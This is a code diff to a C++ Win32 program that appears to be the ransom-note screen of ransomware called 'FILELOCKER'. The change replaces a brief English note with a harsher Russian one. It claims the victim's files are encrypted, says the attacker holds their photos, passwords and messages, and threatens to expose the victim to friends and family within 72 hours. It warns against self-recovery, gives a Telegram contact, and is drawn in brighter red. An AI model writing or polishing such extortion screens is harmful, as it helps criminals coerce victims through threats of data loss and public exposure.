@@ -57,12 +57,22 @@ static const wchar_t* kArt[] = {
 };
 static constexpr int kArtLines = sizeof(kArt) / sizeof(kArt[0]);
 
-// === ЗАПИСКА ===
+// === ЖЁСТКАЯ ЗАПИСКА ===
 static const wchar_t* kNote[] = {
-    L"FILELOCKER",
+    L"=====================================================",
+    L"ВСЕ ТВОИ ФАЙЛЫ ЗАШИФРОВАНЫ.",
+    L"ТВОЯ ЦИФРОВАЯ ЖИЗНЬ ТЕПЕРЬ ПРИНАДЛЕЖИТ МНЕ.",
     L"",
-    L"Your files are encrypted with AES-256.",
-    L"Contact: @flk_recover (Telegram)  ·  72 hours",
+    L"Я ЗНАЮ О ТЕБЕ ВСЁ.",
+    L"ВСЕ ТВОИ ФОТО, ПАРОЛИ, ПЕРЕПИСКИ И ДОКУМЕНТЫ - У МЕНЯ.",
+    L"",
+    L"ЕСЛИ НЕ ХОЧЕШЬ, ЧТОБЫ ТВОЙ ID УЛЕТЕЛ В СЕТЬ, ЧТОБЫ О ТЕБЕ",
+    L"УЗНАЛИ ВСЕ ТВОИ ДРУЗЬЯ И СЕМЬЯ - У ТЕБЯ 72 ЧАСА.",
+    L"ПОПЫТАЕШЬСЯ ВОССТАНОВИТЬ САМ - КЛЮЧ СГОРИТ НАВСЕГДА.",
+    L"",
+    L"СВЯЗЬ: @flk_recover (Telegram)",
+    L"ТВОЙ ID: FLK-СКРЫТО-В-ФАЙЛАХ",
+    L"=====================================================",
 };
 static constexpr int kNoteLines = sizeof(kNote) / sizeof(kNote[0]);
 
@@ -79,11 +89,11 @@ static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
 
         int cx = r.right - r.left, cy = r.bottom - r.top;
         
-        // Общее количество строк (арт + отступ + записка)
+        // Общее количество строк
         int total = kArtLines + 4 + kNoteLines;
         int fs = cy / (total + 4); if (fs < 2) fs = 2;
 
-        // Моноширинный шрифт Consolas
+        // Моноширинный шрифт
         HFONT f = CreateFontW(-fs, 0, 0, 0, FW_BOLD, 0, 0, 0,
             DEFAULT_CHARSET, OUT_TT_PRECIS, CLIP_DEFAULT_PRECIS,
             ANTIALIASED_QUALITY, FIXED_PITCH | FF_MODERN, L"Consolas");
@@ -102,15 +112,14 @@ static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
             }
         };
 
-        // Центрирование по вертикали
         int y = (cy - total * lh) / 2; if (y < 0) y = 0;
         
-        // Рисуем арт (тёмно-красный)
+        // Рисуем арт (темно-красный)
         draw(kArt, kArtLines, y, RGB(160, 20, 20)); 
         y += lh * 2; // Отступ
         
-        // Рисуем записку (ярко-красный)
-        draw(kNote, kNoteLines, y, RGB(240, 60, 60));
+        // Рисуем записку (ярко-красный, чтобы горело)
+        draw(kNote, kNoteLines, y, RGB(255, 40, 40));
 
         SelectObject(dc, old); DeleteObject(f);
         EndPaint(h, &ps);
